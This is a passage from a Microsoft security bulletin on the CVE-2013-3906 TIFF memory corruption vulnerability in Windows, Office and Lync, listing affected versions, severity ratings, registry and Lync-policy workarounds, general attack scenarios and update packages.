**If I applied the automated Microsoft Fix it solution previously described in Microsoft Security Advisory 2896666, should I** **undo the workaround after applying this update?**

Yes, customers should undo the workaround after applying this update. If you do not undo the workaround at some point, you will not be able to properly view TIFF files.

To undo the **Microsoft Fix it solution**, you can follow the steps in [Microsoft Knowledge Base Article 2908005](https://support.microsoft.com/kb/2908005).

**If I applied the** **Disable data collaboration in Lync workaround** **previously described in Microsoft Security Advisory 2896666,** **should I** **undo the workaround after applying this update?**

Yes, customers who have disabled collaboration in Lync should undo the workaround after applying the update. If you do not undo the workaround, you will not be able to share and collaborate on PowerPoint files, polls, and Whiteboard during Lync meetings.

To undo the **Disable data collaboration in Lync** workaround, see the **Workarounds** section in this bulletin.

**Based on the configuration of my system, how do I know if my system is affected?**

Even if you are running an operating system that is not affected, your system could still be vulnerable if you have an affected version of Microsoft Office or Microsoft Lync installed. Refer to the following table to verify whether your system might be affected through a version of Office or Lync, and to verify the updates that are applicable to your configuration:

| Affected Software | Installed on Windows XP[1] | Installed on Windows Server 2003 Service Pack 2 | Installed on Windows Vista Service Pack 2 | Installed on Windows Server 2008 Service Pack 2 | Installed on Windows 7 Service Pack 1 | Installed on Windows Server 2008 R2 Service Pack 1 | Installed on Windows 8 | Installed on Windows 8.1 | Installed on Windows Server 2012 | Installed on Windows Server 2012 R2 |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Microsoft Office 2003 Service Pack 3 | Affected\ (Update 2850047) | Affected\ (Update 2850047) | Affected\ (Update 2850047 and Update 2901674) | Affected\ (Update 2850047 and Update 2901674) | Affected\ (Update 2850047) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] |
| Microsoft Office 2007 Service Pack 3 | Under active attack\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) |
| Microsoft Office 2010 Service Pack 1 (32-bit editions) | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2010 Service Pack 2 (32-bit editions) | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2010 Service Pack 1 (64-bit editions) | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2010 Service Pack 2 (64-bit editions) | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2013 (32-bit editions) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2013 (64-bit editions) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2013 RT | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office Compatibility Pack Service Pack 3 | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) |
| Microsoft Word Viewer | Affected\ (Update 2850047) | Affected\ (Update 2850047) | Affected\ (Update 2850047 and Update 2901674) | Affected\ (Update 2850047 and Update 2901674) | Affected\ (Update 2850047) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] |
| Microsoft Excel Viewer | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) |
| Microsoft PowerPoint 2010 Viewer Service Pack 1 | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft PowerPoint 2010 Viewer Service Pack 2 | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Lync 2010 (32-bit) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397 and Update 2901674) | Affected\ (Update 2899397 and Update 2901674) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) |
| Microsoft Lync 2010 (64-bit) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397 and Update 2901674) | Affected\ (Update 2899397 and Update 2901674) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) |
| Microsoft Lync 2010 Attendee (user level install) | Affected\ (Update 2899393) | Affected\ (Update 2899393) | Affected\ (Update 2899393 and Update 2901674) | Affected\ (Update 2899393 and Update 2901674) | Affected\ (Update 2899393) | Affected\ (Update 2899393) | Affected\ (Update 2899393) | Affected\ (Update 2899393) | Affected\ (Update 2899393) | Affected\ (Update 2899393) |
| Microsoft Lync 2010 Attendee (admin level install) | Affected\ (Update 2899395) | Affected\ (Update 2899395) | Affected\ (Update 2899395 and Update 2901674) | Affected\ (Update 2899395 and Update 2901674) | Affected\ (Update 2899395) | Affected\ (Update 2899395) | Affected\ (Update 2899395) | Affected\ (Update 2899395) | Affected\ (Update 2899395) | Affected\ (Update 2899395) |
| Microsoft Lync 2013 (32-bit) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) |
| Microsoft Lync Basic 2013 (32-bit) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) |
| Microsoft Lync 2013 (64-bit) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) |
| Microsoft Lync Basic 2013 (64-bit) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) |

[1]Applies to Windows XP Service Pack 3 and Windows XP Professional x64 Edition Service Pack 2.

[2]Not a supported configuration for Microsoft Office or Microsoft Lync. It should be a priority for customers who have older releases of the software to migrate to supported releases to prevent potential exposure to vulnerabilities. To determine the support lifecycle for your software release, see [Select a Product for Lifecycle Information](https://go.microsoft.com/fwlink/?linkid=169555).

**I am being offered this update for software that is not specifically listed in the Affected Software table. Why am I being offered this update?**

When updates address vulnerable code that exists in a component that is shared between multiple Microsoft Office products or shared between multiple versions of the same Microsoft Office product, the update is considered to be applicable to all supported products and versions that contain the vulnerable component.

For example, when an update applies to Microsoft Office 2007 products, only Microsoft Office 2007 may be specifically listed in the Affected Software table. However, the update could apply to Microsoft Word 2007, Microsoft Excel 2007, Microsoft Visio 2007, Microsoft Compatibility Pack, Microsoft Excel Viewer, or any other Microsoft Office 2007 product that is not specifically listed in the Affected Software table.

For example, when an update applies to Microsoft Office 2010 products, only Microsoft Office 2010 may be specifically listed in the Affected Software table. However, the update could apply to Microsoft Word 2010, Microsoft Excel 2010, Microsoft Visio 2010, Microsoft Visio Viewer, or any other Microsoft Office 2010 product that is not specifically listed in the Affected Software table.

For more information on this behavior and recommended actions, see Microsoft Knowledge Base Article 830335. For a list of Microsoft Office products an update may apply to, refer to the Microsoft Knowledge Base Article associated with the specific update.

**I am being offered this update for software that is not vulnerable. Why am I being offered this update?**

In some cases, an update may apply to Microsoft Office products that are specifically listed in the Non-Affected Software table or that are otherwise listed in the Affected Software table with "Not applicable" for security impact. For example, you may be offered a Microsoft Office security update even though this security bulletin indicates that the Office products or the version of the Office products that you do have installed are not affected. For more information on this behavior, see [Microsoft Knowledge Base Article 830335](https://support.microsoft.com/kb/830335).

**I do** **not have Microsoft Lync 2013 software installed. Why am I being offered an update for Microsoft Lync 2013?**

You may be offered an update for Microsoft Lync 2013 even though you do not have the affected software installed, if you have Microsoft Office software that contains the vulnerable shared component of Microsoft Office 2013 and Microsoft Lync 2013. Note that because the software does not access the vulnerable code, the software is not affected by the vulnerability. However, since the vulnerable code is present, this update will be offered.

**Does the offer to update a non-vulnerable version of Microsoft Office software constitute an issue in the servicing model for Microsoft Office updates?**

No. The servicing model is based on how the update applies to shared components of Microsoft Office software. Some of the products offered an update may not access the vulnerable code, and thus the software is not affected by the vulnerability. However, the update mechanism is functioning correctly in that it detects a product version for applicable software on the system that is within the range of product versions that the update applies to, and thus offers the update. This helps to maintain consistency for shared files across Office products.

**Why is the Lync 2010 Attendee (user level install) update only available from the Microsoft Download Center?**

Microsoft is releasing the update for Lync 2010 Attendee (user level install) to the [Microsoft Download Center](https://go.microsoft.com/fwlink/?linkid=21129) only. Because the user level installation of Lync 2010 Attendee is handled through a Lync session, distribution methods such as automatic updating are not appropriate for this type of installation scenario.

**I am using an older release of the software discussed in this security bulletin. What should I do?**

The affected software listed in this bulletin has been tested to determine which releases are affected. Other releases are past their support life cycle. For more information about the product lifecycle, see the [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742) website.

It should be a priority for customers who have older releases of the software to migrate to supported releases to prevent potential exposure to vulnerabilities. To determine the support lifecycle for your software release, see [Select a Product for Lifecycle Information](https://go.microsoft.com/fwlink/?linkid=169555). For more information about service packs for these software releases, see [Service Pack Lifecycle Support Policy](https://go.microsoft.com/fwlink/?linkid=89213).

Customers who require custom support for older software must contact their Microsoft account team representative, their Technical Account Manager, or the appropriate Microsoft partner representative for custom support options. Customers without an Alliance, Premier, or Authorized Contract can contact their local Microsoft sales office. For contact information, see the [Microsoft Worldwide Information](https://go.microsoft.com/fwlink/?linkid=33329) website, select the country in the Contact Information list, and then click **Go** to see a list of telephone numbers. When you call, ask to speak with the local Premier Support sales manager. For more information, see the [Microsoft Support Lifecycle Policy FAQ](https://go.microsoft.com/fwlink/?linkid=169557).

### **Vulnerability Information**

## Severity Ratings and Vulnerability Identifiers

The following severity ratings assume the potential maximum impact of the vulnerability. For information regarding the likelihood, within 30 days of this security bulletin's release, of the exploitability of the vulnerability in relation to its severity rating and security impact, please see the Exploitability Index in the [December bulletin summary](https://technet.microsoft.com/security/bulletin/ms13-dec). For more information, see [Microsoft Exploitability Index](https://technet.microsoft.com/security/cc998259).

| Affected Software | Microsoft Graphics Component Memory Corruption Vulnerability - CVE-2013-3906 | Aggregate Severity Rating |
| --- | --- | --- |
| Windows Vista |  |  |
| Windows Vista Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Windows Vista x64 Edition Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Windows Server 2008 |  |  |
| Windows Server 2008 for 32-bit Systems Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Windows Server 2008 for x64-based Systems Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Windows Server 2008 for Itanium-based Systems Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Server Core installation option |  |  |
| Windows Server 2008 for 32-bit Systems Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Windows Server 2008 for x64-based Systems Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Microsoft Office |  |  |
| Microsoft Office 2003 Service Pack 3 | **Critical** Remote Code Execution | **Critical** |
| Microsoft Office 2007 Service Pack 3 | **Critical** Remote Code Execution | **Critical** |
| Microsoft Office 2010 Service Pack 1 (32-bit editions) | **Critical** Remote Code Execution | **Critical** |
| Microsoft Office 2010 Service Pack 1 (64-bit editions) | **Critical** Remote Code Execution | **Critical** |
| Microsoft Office Compatibility Pack Service Pack 3 | **Critical** Remote Code Execution | **Critical** |
| Microsoft Word Viewer | **Critical** Remote Code Execution | **Critical** |
| Microsoft Excel Viewer | **Critical** Remote Code Execution | **Critical** |
| Microsoft PowerPoint 2010 Viewer Service Pack 1 | **Critical** Remote Code Execution | **Critical** |
| Microsoft PowerPoint 2010 Viewer Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Microsoft Lync |  |  |
| Microsoft Lync 2010 (32-bit) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync 2010 (64-bit) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync 2010 Attendee (user level install) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync 2010 Attendee (admin level install) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync 2013 (32-bit) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync Basic 2013 (32-bit) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync 2013 (64-bit) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync Basic 2013 (64-bit) | **Important** Remote Code Execution | **Important** |

## Microsoft Graphics Component Memory Corruption Vulnerability - CVE-2013-3906

A remote code execution vulnerability exists in the way that affected Windows components and other affected software handle specially crafted TIFF files. The vulnerability could allow remote code execution if a user views TIFF files in shared content. An attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full administrative rights.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2013-3906](https://www.cve.org/CVERecord?id=CVE-2013-3906).

#### Mitigating Factors

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* An attacker who successfully exploited this vulnerability could gain the same user rights as the current user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

#### Workarounds

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Disable the TIFF codec**

  **Note** See [Microsoft Knowledge Base Article 2908005](https://support.microsoft.com/kb/2908005) to use the automated **Microsoft Fix it** solution to enable or disable this workaround.

  **Note** This workaround is not applicable to Windows 8, Windows 8.1, Windows Server 2012, Windows Server 2012 R2, Windows RT, and Windows RT 8.1.

  You can prevent TIFF files from being displayed by modifying the registry to control the parsing of the TIFF codec. By changing the registry entries, you can control which images are parsed and rendered and which images are rejected in GDI+. For example, you can select to parse and render Joint Photographic Experts Group (JPEG) images, but block Tagged Image File Format (TIFF) images.

  **Warning**: If you use Registry Editor incorrectly, you may cause serious problems that may require you to reinstall your operating system. Microsoft cannot guarantee that you can solve problems that result from using Registry Editor incorrectly. Use Registry Editor at your own risk.

  **Note** After you change a registry entry, you must restart the application that uses the codec.

  To disable the TIFF codec:

  1. To add a registry entry, create one of the following registry subkeys for the
     appropriate Windows platform:

     For 32-bit systems:

     HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Gdiplus

     For 32-bit applications on 64-bit systems:

     HKEY\_LOCAL\_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Gdiplus

     For 64-bit systems:

     HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Gdiplus
  2. Create a **DWORD** value for the TIFF code by creating a registry entry (**DWORD** value) under the registry subkey you created in step 1:

     **DisableTIFFCodec**
  3. To disable the TIFF codec, set value of the **DisableTIFFCodec** registry entry to **1**.

  **Impact of Workaround.** You will not be able to view TIFF files using any of the affected products.

  **How to undo the workaround**

  To re-enable the TIFF codec, set the value of the **DisableTIFFCodec** registry entry to **0**.
* **Disable data collaboration in Lync**

  Enterprise users who manage directly a Lync server can prevent PowerPoint files (which may be used as an attack vector to send specially crafted TIFF files) from being shared through Lync by using the Lync Server Control Panel to modify the Lync conferencing policy for data collaboration.

  **For Lync 2010 and Lync 2013:**

  1. Open the Lync Control Panel. For details about the different methods you can use to start Lync Server Control Panel, see [Open Lync Server Administrative Tools](https://technet.microsoft.com/library/gg195741.aspx).
  2. In the left navigation bar, click **Conferencing** and then click **Conferencing Policy**.
  3. In the list of conferencing policies, click **Data collaboration**, click **Edit**, and then click **Show details**.
  4. To prevent data collaboration, in **Edit Conferencing Policy**, click **None**. The default setting is **Enable data collaboration**.
  5. Click **Commit**.

  **Impact of Workaround.** Users will not be able to share and collaborate on PowerPoint files, polls, and Whiteboard during Lync meetings.

  **How to undo the workaround**

  To re-enable data collaboration:

  1. Open the Lync Control Panel. For details about the different methods you can use to start Lync Server Control Panel, see [Open Lync Server Administrative Tools](https://technet.microsoft.com/library/gg195741.aspx).
  2. In the left navigation bar, click **Conferencing** and then click **Conferencing Policy**.
  3. In the list of conferencing policies, click **Data collaboration**, click **Edit**, and then click **Show details**.
  4. To enable data collaboration, in **Edit Conferencing Policy**, click **Enable data collaboration**.
  5. Click **Commit**.

#### FAQ

**What is the scope of the vulnerability?**

This is a remote code execution vulnerability.

**What causes the vulnerability?**

The vulnerability is caused when Microsoft Windows, Microsoft Office, or Microsoft Lync fails to properly handle specially crafted TIFF files. System memory may be corrupted in such a way that an attacker could execute arbitrary code.

**What is GDI+?**

GDI+ is a graphics device interface that provides two-dimensional vector graphics, imaging, and typography to applications and programmers.

**What is a TIFF file?**

A TIFF (tagged image file format) file allows information to be embedded in the image file, such as the compression scheme, color mode, and size.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could cause arbitrary code to run with the privileges of the user who opens a specially crafted file or browses a website that contains specially crafted content. If the user is logged on with administrative user rights, an attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

**How could an attacker exploit the vulnerability?**

There are multiple means that could allow an attacker to exploit this vulnerability.

In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit this vulnerability and then convince a user to view the website. An attacker would have no way to force users to view the attacker-controlled content. Instead, an attacker would have to convince users to take action, typically by getting them to click a link in an email message or in an Instant Messenger message that takes users to the attacker's website, or by opening an attachment sent through email.

In a file sharing attack scenario, an attacker could provide a specially crafted document file that is designed to exploit this vulnerability, and then convince a user to open the document file.

In an email attack scenario, an attacker could exploit the vulnerability by sending specially crafted Office data in the contents of an email message. The vulnerability could be exploited when a user opens or previews the specially crafted email message in Outlook while using Microsoft Word as the email reader. Note that by default, Microsoft Word is not the email reader in Outlook 2003. An attacker could also exploit the vulnerability by sending a specially crafted Office file to the user, and then convincing the user to open the file with an affected version of Microsoft Office software.

In a local attack scenario, an attacker could also exploit this vulnerability by running a specially crafted application to take complete control over the affected system. However, the attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability in this scenario.

**What systems are primarily at risk from the vulnerability?**

Workstations and terminal servers running affected software are primarily at risk.

**Does EMET help mitigate attacks that could attempt to exploit this vulnerability?**

Yes. The Enhanced Mitigation Experience Toolkit (EMET) enables users to manage security mitigation technologies that help make it more difficult for attackers to exploit vulnerabilities in a given piece of software. EMET helps to mitigate this vulnerability in affected software on systems where EMET is installed and configured to work with the affected software.

For more information about EMET, see [The Enhanced Mitigation Experience Toolkit](https://technet.microsoft.com/security/jj653751).

**What does the update do?**

The update addresses the vulnerability by correcting the way the affected software handles TIFF files.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

Yes. This vulnerability has been publicly disclosed. It has been assigned Common Vulnerability and Exposure number [CVE-2013-3906](https://www.cve.org/CVERecord?id=CVE-2013-3906). This vulnerability was first described in [Microsoft Security Advisory 2896666](https://technet.microsoft.com/security/advisory/2896666).

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

Yes. Microsoft is aware of targeted attacks that attempt to exploit this vulnerability in Microsoft Office products.

### Update Information

## Detection and Deployment Tools and Guidance

Several resources are available to help administrators deploy security updates.

* Microsoft Baseline Security Analyzer (MBSA) lets administrators scan local and remote systems for missing security updates and common security misconfigurations.
* Windows Server Update Services (WSUS), Systems Management Server (SMS), and System Center Configuration Manager help administrators distribute security updates.
* The Update Compatibility Evaluator components included with Application Compatibility Toolkit aid in streamlining the testing and validation of Windows updates against installed applications.

For information about these and other tools that are available, see [Security Tools for IT Pros](https://technet.microsoft.com/security/cc297183).

## Security Update Deployment

**Affected Software**

For information about the specific security update for your affected software, click the appropriate link:

#### Windows Vista (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file names** | For all supported 32-bit editions of Windows Vista:\ **Windows6.0-KB2901674-x86.msu** |
| --- | --- |
| For all supported x64-based editions of Windows Vista:\ **Windows6.0-KB2901674-x64.msu** |  |
| **Installation switches** | See [Microsoft Knowledge Base Article 934307](https://support.microsoft.com/kb/934307) |
| **Restart requirement** | Yes, you must restart your system after you apply this security update. |
| **Removal** **information** | WUSA.exe does not support uninstall of updates. To uninstall an update installed by WUSA, click **Control Panel**, and then click **Security**. Under Windows Update, click **View installed updates** and select from the list of updates. |
| **File** **information** | See [Microsoft Knowledge Base Article 2901674](https://support.microsoft.com/kb/2901674) |
| **Registry** **key** **verification** | **Note** A registry key does not exist to validate the presence of this update. |

#### Windows Server 2008 (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file names** | For all supported 32-bit editions of Windows Server 2008:\ **Windows6.0-KB2901674-x86.msu** |
| --- | --- |
| For all supported x64-based editions of Windows Server 2008:\ **Windows6.0-KB2901674-x64.msu** |  |
| For all supported Itanium-based editions of Windows Server 2008:\ **Windows6.0-KB2901674-ia64.msu** |  |
| **Installation switches** | See [Microsoft Knowledge Base Article 934307](https://support.microsoft.com/kb/934307) |
| **Restart requirement** | Yes, you must restart your system after you apply this security update. |
| **Removal** **information** | WUSA.exe does not support uninstall of updates. To uninstall an update installed by WUSA, click **Control Panel**, and then click **Security**. Under Windows Update, click **View installed updates** and select from the list of updates. |
| **File information** | See [Microsoft Knowledge Base Article 2901674](https://support.microsoft.com/kb/2901674) |
| **Registry** **key** **verification** | **Note** A registry key does not exist to validate the presence of this update. |

#### Microsoft Office 2003 (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file name** | For Office 2003 Service Pack 3:**office2003-kb2850047-fullfile-enu.exe** |
| --- | --- |
| **Installation switches** | See [Microsoft Knowledge Base Article 197147](https://support.microsoft.com/kb/197147) |
| **Restart requirement** | In some cases, this update does not require a restart. If the required files are being used, this update will require a restart. If this behavior occurs, a message appears that advises you to restart.\ \ To help reduce the chance that a restart will be required, stop all affected services and close all applications that may use the affected files prior to installing the security update. For more information about the reasons why you may be prompted to restart, see [Microsoft Knowledge Base Article 887012](https://support.microsoft.com/kb/887012). |
| **Removal information** | Use **Add or Remove Programs** item in Control Panel.\ \ **Note** When you remove this update, you may be prompted to insert the Microsoft Office 2003 CD in the CD drive. Additionally, you may not have the option to uninstall the update from the Add or Remove Programs item in Control Panel. There are several possible causes for this issue. For more information about the removal, see [Microsoft Knowledge Base Article 903771](https://support.microsoft.com/kb/903771). |
| **File information** | See [Microsoft Knowledge Base Article 2850047](https://support.microsoft.com/kb/2850047) |
| **Registry key verification** | Not applicable |

#### Microsoft Office 2007 (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file name** | For all supported editions of Microsoft Office 2007:\ **ogl2007-kb2817641-fullfile-x86-glb.exe** |
| --- | --- |
| **Installation switches** | See [Microsoft Knowledge Base Article 912203](https://support.microsoft.com/kb/912203) |
| **Restart requirement** | In some cases, this update does not require a restart. If the required files are being used, this update will require a restart. If this behavior occurs, a message appears that advises you to restart.\ \ To help reduce the chance that a restart will be required, stop all affected services and close all applications that may use the affected files prior to installing the security update. For more information about the reasons why you may be prompted to restart, see [Microsoft Knowledge Base Article 887012](https://support.microsoft.com/kb/887012). |
| **Removal information** | Use **Add or Remove Programs** item in Control Panel. |
| **File information** | See [Microsoft Knowledge Base Article 2817641](https://support.microsoft.com/kb/2817641) |
| **Registry key verification** | Not applicable |

#### Microsoft Office 2010 (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file name** | For all supported editions of Microsoft Office 2010 (32-bit editions):\ **ogl2010-kb2817670-fullfile-x86-glb.exe** |
| --- | --- |
| For all supported editions of Microsoft Office 2010 (64-bit editions):\ **ogl2010-kb2817670-fullfile-x64-glb.exe** |  |
| **Installation switches** | See [Microsoft Knowledge Base Article 912203](https://support.microsoft.com/kb/912203) |
| **Restart requirement** | In some cases, this update does not require a restart. If the required files are being used, this update will require a restart. If this behavior occurs, a message appears that advises you to restart.\ \ To help reduce the chance that a restart will be required, stop all affected services and close all applications that may use the affected files prior to installing the security update. For more information about the reasons why you may be prompted to restart, see [Microsoft Knowledge Base Article 887012](https://support.microsoft.com/kb/887012). |
| **Removal information** | Use **Add or Remove Programs** item in Control Panel. |
| **File information** | See [Microsoft Knowledge Base Article 2817670](https://support.microsoft.com/kb/2817670) |
| **Registry key verification** | Not applicable |

#### Microsoft Lync 2010, Microsoft Lync 2010 Attendee, Microsoft Lync 2013, and Microsoft Lync Basic 2013

**Reference Table**

The following table contains the security update information for this software.

| **Security update file name** | For Microsoft Lync 2010 (32-bit) (2899397):\ **lync.msp** |
| --- | --- |
|  | For Microsoft Lync 2010 (64-bit) (2899397):\ **lync.msp** |
| For Microsoft Lync 2010 Attendee (user level install) (2899393):\ **AttendeeUser.msp** |  |
| For Microsoft Lync 2010 Attendee (admin level install) (2899395):\ **AttendeeAdmin.msp** |  |
| For Microsoft Lync 2013 (32-bit) and Microsoft Lync Basic 2013 (32-bit):\ **lyncloc2013-kb2850057-fullfile-x86-glb.exe** |  |
| For Microsoft Lync 2013 (64-bit) and Microsoft Lync Basic 2013 (64-bit):\ **lyncloc2013-kb2850057-fullfile-x64-glb.exe** |  |
| **Installation switches** | See [Microsoft Knowledge Base Article 912203](https://support.microsoft.com/kb/912203) |
| **Restart requirement** | In some cases, this update does not require a restart. If the required files are being used, this update will require a restart. If this behavior occurs, a message appears that advises you to restart.\ \ To help reduce the chance that a restart will be required, stop all affected services and close all applications that may use the affected files prior to installing the security update. For more information about the reasons why you may be prompted to restart, see [Microsoft Knowledge Base Article 887012](https://support.microsoft.com/kb/887012). |
| **Removal** **Information** | Use **Add or Remove Programs** item in Control Panel. |
| **File Information** | For all supported editions of Microsoft Lync 2010:\ See [Microsoft Knowledge Base Article 2899397](https://support.microsoft.com/kb/2899397) |
| For Microsoft Lync 2010 Attendee (user level install):\ See [Microsoft Knowledge Base Article 2899393](https://support.microsoft.com/kb/2899393) |  |
| For Microsoft Lync 2010 Attendee (admin level install):\ See [Microsoft Knowledge Base Article 2899395](https://support.microsoft.com/kb/2899395) |  |
| For all supported editions of Microsoft Lync 2013:\ See [Microsoft Knowledge Base Article 2850057](https://support.microsoft.com/kb/2850057) |  |
| **Registry Key Verification** | For Microsoft Lync 2010 (32-bit):\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components{0EEB34F6-991D-4a1b-8EEB-772DA0EADB22}\ Version = **7577.4415** |
| For Microsoft Lync 2010 (64-bit):\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components{0EEB34F6-991D-4a1b-8EEB-772DA0EADB22}\ Version = **7577.4415** |  |
| For Microsoft Lync 2010 Attendee (admin level install):\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\94E53390F8C13794999249B19E6CFE33\InstallProperties\DisplayVersion = **4.0.7577.4415** |  |
| For Microsoft Lync 2010 Attendee (user level install):\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components{0EEB34F6-991D-4a1b-8EEB-772DA0EADB22}\ Version = **7577.4415** |  |
| For Microsoft Lync 2013 (32-bit) and Microsoft Lync Basic 2013 (32-bit):\ Not applicable |  |
| For Microsoft Lync 2013 (64-bit) and Microsoft Lync Basic 2013 (64-bit):\ Not applicable |  |

### Other Information

#### Acknowledgments

Microsoft [thanks](https://go.microsoft.com/fwlink/?linkid=21127) the following for working with us to help protect customers:

* Haifei Li of McAfee Labs IPS Team for reporting the Microsoft Graphics Component Memory Corruption Vulnerability (CVE-2013-3906)

#### Microsoft Active Protections Program (MAPP)

To improve security protections for customers, Microsoft provides vulnerability information to major security software providers in advance of each monthly security update release. Security software providers can then use this vulnerability information to provide updated protections to customers via their security software or devices, such as antivirus, network-based intrusion detection systems, or host-based intrusion prevention systems. To determine whether active protections are available from security software providers, please go to the active protections websites provided by program partners, listed in [Microsoft Active Protections Program (MAPP) Partners](https://go.microsoft.com/fwlink/?linkid=215201).

#### Support

**How to obtain help and support for this security update**

* Help installing updates: [Support for Microsoft Update](https://support.microsoft.com/ph/6527)
